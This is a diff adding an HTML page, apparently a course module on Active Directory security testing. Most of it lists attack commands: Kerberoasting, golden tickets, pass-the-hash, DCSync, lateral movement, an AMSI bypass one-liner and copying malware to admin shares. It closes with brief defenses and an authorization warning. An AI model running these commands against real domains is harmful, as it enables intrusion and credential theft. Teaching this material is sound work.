@@ -1,0 +1,318 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 19: Active Directory Security Testing</title>
+    <link rel="stylesheet" href="/modules/module-style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Module 19: Active Directory Security Testing</h1>
+
+        <div class="image-container">
+            <img src="/images/active-directory.jpg" alt="Active Directory Security Testing" />
+        </div>
+
+        <h2>Learning Objectives</h2>
+        <ul>
+            <li>Understand Active Directory architecture and components</li>
+            <li>Learn common AD vulnerabilities and attack vectors</li>
+            <li>Master Kerberos authentication security testing</li>
+            <li>Explore domain enumeration and reconnaissance techniques</li>
+            <li>Understand privilege escalation and lateral movement in AD</li>
+        </ul>
+
+        <h2>Active Directory Fundamentals</h2>
+        <p>
+            Active Directory (AD) is Microsoft's directory service that manages user accounts, computers, 
+            and resources in a Windows domain environment. Understanding AD architecture is crucial for 
+            effective security testing and identifying potential attack vectors.
+        </p>
+
+        <h3>AD Components</h3>
+        <ul>
+            <li><strong>Domain Controller (DC):</strong> Centralized authentication and authorization</li>
+            <li><strong>Forest:</strong> Collection of one or more domain trees</li>
+            <li><strong>Domain:</strong> Administrative and security boundary</li>
+            <li><strong>Organizational Units (OUs):</strong> Container objects for organizing resources</li>
+            <li><strong>Group Policy Objects (GPOs):</strong> Configuration management</li>
+        </ul>
+
+        <h2>AD Enumeration and Reconnaissance</h2>
+        <h3>Domain Discovery</h3>
+        <pre><code># DNS enumeration for domain discovery
+nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
+dig -t SRV _ldap._tcp.dc._msdcs.domain.com
+
+# NetBIOS enumeration
+nbtscan -r 192.168.1.0/24
+enum4linux -a target_ip</code></pre>
+
+        <h3>SMB Enumeration</h3>
+        <pre><code># SMB service enumeration
+smbclient -L //target_ip -N
+smbmap -H target_ip
+crackmapexec smb target_ip
+
+# SMB null session enumeration
+rpcclient -U "" -N target_ip
+enum4linux -u "" -p "" target_ip</code></pre>
+
+        <h3>LDAP Enumeration</h3>
+        <pre><code># LDAP anonymous bind
+ldapsearch -x -H ldap://target_ip -b "dc=domain,dc=com"
+ldapsearch -x -H ldap://target_ip -s base namingcontexts
+
+# LDAP with credentials
+ldapsearch -x -H ldap://target_ip -D "cn=user,dc=domain,dc=com" -W</code></pre>
+
+        <h2>User and Group Enumeration</h2>
+        <h3>PowerShell AD Enumeration</h3>
+        <pre><code># PowerShell Active Directory module
+Get-ADUser -Filter * -Properties *
+Get-ADGroup -Filter * -Properties *
+Get-ADComputer -Filter * -Properties *
+
+# PowerView enumeration
+Get-DomainUser
+Get-DomainGroup
+Get-DomainComputer
+Get-DomainController</code></pre>
+
+        <h3>BloodHound for AD Mapping</h3>
+        <pre><code># BloodHound data collection
+.\SharpHound.exe --CollectionMethod All --Domain domain.com
+python3 bloodhound.py -d domain.com -u username -p password -gc dc.domain.com -c all
+
+# BloodHound analysis queries
+MATCH (u:User {admincount:true}) RETURN u
+MATCH (c:Computer)-[:AdminTo]->(u:User) RETURN c,u</code></pre>
+
+        <h2>Kerberos Security Testing</h2>
+        <h3>Kerberos Authentication Process</h3>
+        <ol>
+            <li><strong>Authentication Server (AS) Request:</strong> Client requests TGT</li>
+            <li><strong>TGT Response:</strong> AS provides Ticket Granting Ticket</li>
+            <li><strong>Ticket Granting Server (TGS) Request:</strong> Client requests service ticket</li>
+            <li><strong>Service Ticket Response:</strong> TGS provides service ticket</li>
+            <li><strong>Service Authentication:</strong> Client authenticates to service</li>
+        </ol>
+
+        <h3>Kerberos Attack Techniques</h3>
+        <h4>AS-REP Roasting</h4>
+        <pre><code># AS-REP roasting with Impacket
+python3 GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
+
+# AS-REP roasting with Rubeus
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt</code></pre>
+
+        <h4>Kerberoasting</h4>
+        <pre><code># Kerberoasting with Impacket
+python3 GetUserSPNs.py domain.com/username:password -dc-ip dc_ip -request
+
+# Kerberoasting with Rubeus
+.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt</code></pre>
+
+        <h4>Golden Ticket Attack</h4>
+        <pre><code># Golden ticket creation with Mimikatz
+mimikatz "kerberos::golden /domain:domain.com /sid:S-1-5-21-... /krbtgt:krbtgt_hash /user:admin"
+
+# Golden ticket creation with Impacket
+python3 ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain domain.com admin</code></pre>
+
+        <h2>Credential Attacks</h2>
+        <h3>Password Attacks</h3>
+        <pre><code># Password spraying
+crackmapexec smb target_ip -u users.txt -p password_list.txt --continue-on-success
+
+# Brute force attack
+hydra -L users.txt -P passwords.txt smb://target_ip</code></pre>
+
+        <h3>Hash Attacks</h3>
+        <pre><code># Pass-the-Hash attack
+crackmapexec smb target_ip -u username -H ntlm_hash
+python3 psexec.py domain.com/username@target_ip -hashes :ntlm_hash
+
+# DCSync attack
+mimikatz "lsadump::dcsync /domain:domain.com /user:krbtgt"
+python3 secretsdump.py domain.com/username:password@dc_ip</code></pre>
+
+        <h2>Privilege Escalation</h2>
+        <h3>Local Privilege Escalation</h3>
+        <pre><code># Windows privilege escalation enumeration
+.\winPEAS.exe
+.\PrivescCheck.ps1
+.\PowerUp.ps1
+
+# Service exploitation
+sc query
+sc qc service_name
+.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *</code></pre>
+
+        <h3>Domain Privilege Escalation</h3>
+        <ul>
+            <li><strong>Unconstrained Delegation:</strong> Computers trusted for delegation</li>
+            <li><strong>Constrained Delegation:</strong> Service account delegation abuse</li>
+            <li><strong>Resource-Based Constrained Delegation:</strong> Computer account abuse</li>
+            <li><strong>GPO Abuse:</strong> Group Policy modification attacks</li>
+        </ul>
+
+        <h3>Delegation Attacks</h3>
+        <pre><code># Unconstrained delegation discovery
+Get-DomainComputer -UnconstrainedDelegation
+Get-DomainUser -TrustedToAuth
+
+# Constrained delegation abuse
+.\Rubeus.exe s4u /user:service_account /rc4:ntlm_hash /impersonateuser:admin /msdsspn:cifs/target.domain.com</code></pre>
+
+        <h2>Lateral Movement</h2>
+        <h3>Remote Code Execution</h3>
+        <pre><code># PsExec lateral movement
+python3 psexec.py domain.com/username:password@target_ip
+.\PsExec.exe \\target_ip -u username -p password cmd
+
+# WMI lateral movement
+python3 wmiexec.py domain.com/username:password@target_ip
+wmic /node:target_ip /user:username /password:password process call create "cmd.exe"</code></pre>
+
+        <h3>Remote Desktop Protocol (RDP)</h3>
+        <pre><code># RDP enumeration
+nmap -p 3389 --script rdp-enum-encryption target_ip
+rdesktop -u username -p password target_ip
+
+# RDP hijacking
+query session
+tscon session_id /dest:console</code></pre>
+
+        <h2>Persistence Techniques</h2>
+        <h3>Golden Tickets</h3>
+        <pre><code># Golden ticket persistence
+mimikatz "kerberos::golden /domain:domain.com /sid:domain_sid /krbtgt:krbtgt_hash /user:admin /id:500 /ptt"
+
+# Silver ticket creation
+mimikatz "kerberos::golden /domain:domain.com /sid:domain_sid /target:target.domain.com /service:cifs /rc4:service_hash /user:admin /ptt"</code></pre>
+
+        <h3>Administrative Shares</h3>
+        <pre><code># Administrative share access
+net use \\target_ip\c$ /user:domain\username password
+copy malware.exe \\target_ip\c$\windows\temp\
+
+# Hidden shares enumeration
+net view \\target_ip /all</code></pre>
+
+        <h2>Group Policy Security</h2>
+        <h3>GPO Analysis</h3>
+        <pre><code># Group Policy enumeration
+Get-GPO -All | Select-Object DisplayName,Id,GpoStatus
+Get-GPOReport -All -ReportType HTML -Path GPOReport.html
+
+# GPO password discovery
+findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml</code></pre>
+
+        <h3>GPO Abuse Techniques</h3>
+        <ul>
+            <li><strong>Immediate Task GPO:</strong> Schedule task execution</li>
+            <li><strong>Startup Script GPO:</strong> Execute scripts on startup</li>
+            <li><strong>Computer Configuration GPO:</strong> Modify computer settings</li>
+            <li><strong>User Configuration GPO:</strong> Modify user settings</li>
+        </ul>
+
+        <h2>Domain Trust Relationships</h2>
+        <h3>Trust Enumeration</h3>
+        <pre><code># Domain trust enumeration
+Get-DomainTrust
+Get-DomainTrustMapping
+nltest /domain_trusts
+
+# Forest trust enumeration
+Get-ForestTrust
+Get-ForestDomain</code></pre>
+
+        <h3>Trust Attacks</h3>
+        <pre><code># Inter-domain trust attacks
+.\Rubeus.exe golden /rc4:trust_key /domain:child.domain.com /sid:child_sid /sids:enterprise_admin_sid /user:admin
+
+# SID history attacks
+mimikatz "misc::addsid admin S-1-5-21-...-519"</code></pre>
+
+        <h2>Certificate Services Security</h2>
+        <h3>AD Certificate Services (ADCS)</h3>
+        <pre><code># Certificate template enumeration
+certutil -config "ca.domain.com\CA" -template
+
+# Certificate request
+certreq -submit -config "ca.domain.com\CA" request.inf
+
+# Certificate attacks with Certify
+.\Certify.exe find /vulnerable
+.\Certify.exe request /ca:ca.domain.com\CA /template:vulnerable_template</code></pre>
+
+        <h2>Defense Evasion</h2>
+        <h3>AV/EDR Evasion</h3>
+        <pre><code># PowerShell evasion
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File script.ps1
+powershell -EncodedCommand base64_encoded_command
+
+# AMSI bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre>
+
+        <h3>Logging Evasion</h3>
+        <ul>
+            <li><strong>Event Log Clearing:</strong> Remove traces of activity</li>
+            <li><strong>PowerShell Logging Bypass:</strong> Avoid script block logging</li>
+            <li><strong>WMI Event Filters:</strong> Persistent WMI-based execution</li>
+        </ul>
+
+        <h2>AD Security Testing Tools</h2>
+        <h3>Enumeration Tools</h3>
+        <ul>
+            <li><strong>BloodHound:</strong> AD relationship mapping</li>
+            <li><strong>PowerView:</strong> PowerShell AD enumeration</li>
+            <li><strong>AdExplorer:</strong> GUI-based AD browsing</li>
+            <li><strong>ldapdomaindump:</strong> LDAP information gathering</li>
+        </ul>
+
+        <h3>Attack Tools</h3>
+        <ul>
+            <li><strong>Impacket:</strong> Python-based AD attack tools</li>
+            <li><strong>Rubeus:</strong> C# Kerberos attack toolkit</li>
+            <li><strong>Mimikatz:</strong> Credential extraction and manipulation</li>
+            <li><strong>CrackMapExec:</strong> Post-exploitation AD toolkit</li>
+        </ul>
+
+        <h2>AD Security Best Practices</h2>
+        <h3>Preventive Measures</h3>
+        <ul>
+            <li><strong>Least Privilege:</strong> Minimal necessary permissions</li>
+            <li><strong>Regular Updates:</strong> Keep systems patched</li>
+            <li><strong>Strong Passwords:</strong> Complex password policies</li>
+            <li><strong>Account Monitoring:</strong> Privileged account monitoring</li>
+        </ul>
+
+        <h3>Detection and Response</h3>
+        <ul>
+            <li><strong>Logging:</strong> Comprehensive event logging</li>
+            <li><strong>Monitoring:</strong> Real-time security monitoring</li>
+            <li><strong>Threat Hunting:</strong> Proactive threat detection</li>
+            <li><strong>Incident Response:</strong> Prepared response procedures</li>
+        </ul>
+
+        <h2>Conclusion</h2>
+        <p>
+            Active Directory security testing requires deep understanding of Windows domain architecture, 
+            authentication mechanisms, and common attack vectors. The interconnected nature of AD 
+            components makes it a high-value target for attackers.
+        </p>
+
+        <div class="warning">
+            <strong>Important:</strong> AD attacks can have significant impact on business operations. 
+            Always ensure proper authorization and conduct testing in isolated environments when possible.
+        </div>
+
+        <h2>Next Steps</h2>
+        <p>In the next module, we'll explore container and Kubernetes security, learning how to assess containerized applications and orchestration platforms.</p>
+    </div>
+</body>
+</html>
